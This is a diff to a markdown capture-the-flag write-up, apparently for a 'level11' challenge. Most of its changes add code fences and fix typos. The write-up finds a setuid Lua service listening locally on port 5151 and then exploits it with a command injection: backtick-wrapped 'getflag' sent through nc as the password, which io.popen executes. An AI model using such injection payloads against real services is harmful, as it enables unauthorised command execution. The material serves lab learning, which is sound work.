@@ -3,7 +3,7 @@
 ls -la
 -rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua
 ```
-
+```bash
 ./level11.lua
 output:
 lua: ./level11.lua:3: address already in use
@@ -11,8 +11,10 @@ stack traceback:
 	[C]: in function 'assert'
 	./level11.lua:3: in main chunk
 	[C]: ?
+```
 
 # address in use
+```bash
 netstat -tulpn | grep LISTEN
 # ouput
 (No info could be read for "-p": geteuid()=2011 but you should be root.)
@@ -22,7 +24,8 @@ tcp6       0      0 :::4646                 :::*                    LISTEN      
 tcp6       0      0 :::4747                 :::*                    LISTEN      -
 tcp6       0      0 :::80                   :::*                    LISTEN      -
 tcp6       0      0 :::4242                 :::*                    LISTEN      -
-we can conencto to 127.0.0.1 on port 5151
+```
+we can connect to 127.0.0.1 on port 5151
 read the file:
 ```lua
 #!/usr/bin/env lua
@@ -60,7 +63,9 @@ while 1 do
   client:close()
 end
 ```
-io.popen can excute command
+
+*io.popen can excute command*
+
 nc 127.0.0.1 5151
 Password: `getflag` > /tmp/flag
 cat /tmp/falg
